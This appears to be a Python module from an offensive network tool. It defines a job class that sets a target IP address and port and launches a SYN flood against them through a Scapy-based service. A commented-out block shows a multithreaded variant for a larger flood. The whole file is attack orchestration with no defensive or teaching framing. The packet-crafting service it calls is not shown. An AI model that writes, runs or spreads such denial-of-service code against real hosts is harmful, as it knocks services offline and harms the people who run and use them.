import threading
import time

from jobs.abstract_job import AbstractJob
from services.service_scapy import ServiceScapy
from injectable import injectable, autowired, Autowired

@injectable
class JobAttackSynFlood(AbstractJob):
    @autowired
    def __init__(self, service_scapy: Autowired(ServiceScapy)):
        super().__init__()
        self.service_scapy = service_scapy
        self.target_ip_address = None
        self.target_port = None

    def set_target(self, target_ip_address: str, target_port: int):
        self.target_ip_address = target_ip_address
        self.target_port = target_port

    def clean_target(self):
        self.set_target(None, None)

    def job_iteration(self):
        print('JobAttackSynFlood.job_iteration(): Started')

        # Early stop if invalid IP present
        if self.target_ip_address is None or self.target_port is None:
            print('JobAttackSynFlood.job_iteration(): Target IP/port were set invalid ' + str(self.target_ip_address) + ':' + str(self.target_port))
            self.stop()
            return

        # Launch separate threads with attacks
        # for thread_index in range(0, 50):
        #     thread = threading.Thread(target=self.service_scapy.attack_syn_flood, args=[self.target_ip_address, self.target_port, 512, 512])
        #     thread.start()
        #     time.sleep(10)
        self.service_scapy.attack_syn_flood(self.target_ip_address, self.target_port, 512, 512)

        print('JobAttackSynFlood.job_iteration(): Finished')
